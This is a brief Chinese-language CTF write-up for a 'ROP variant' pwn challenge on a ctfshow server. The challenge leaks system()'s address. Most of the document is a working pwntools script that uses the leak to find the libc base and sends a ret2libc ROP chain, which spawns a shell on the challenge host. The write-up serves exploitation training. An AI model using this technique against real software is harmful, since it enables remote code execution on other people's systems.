# 挑战简介
ROP变种

# 思路
ROP变种，其实是开始就给了你一个system函数的地址，有了这个地址，我们可以得到什么？  
- base基址
- libc的版本
- 以及通过偏移量推算出各函数的地址

还是ROP  
```
from pwn import *
from LibcSearcher import *
import base64
context(arch="amd64", log_level="debug")

p = remote("pwn.challenge.ctf.show",28262)
elf = ELF('D:\edge 下载\pwn')

offset = 0x80 + 0x8

ret = 0x1b5a8

pop_rdi = 0x2146f

p.recvuntil('O.o\n')

sys_addr = int(p.recv(14),16)

libc = LibcSearcher('system', sys_addr)

base = sys_addr - libc.dump('system')

bin_sh_addr = base + libc.dump('str_bin_sh')

print("system:",hex(sys_addr))
print("binsh:",hex(bin_sh_addr))

ret = base + ret

rdi = base + pop_rdi

p.send(b'a' * offset + p64(ret) + p64(rdi) + p64(bin_sh_addr) + p64(sys_addr))

p.interactive()
```
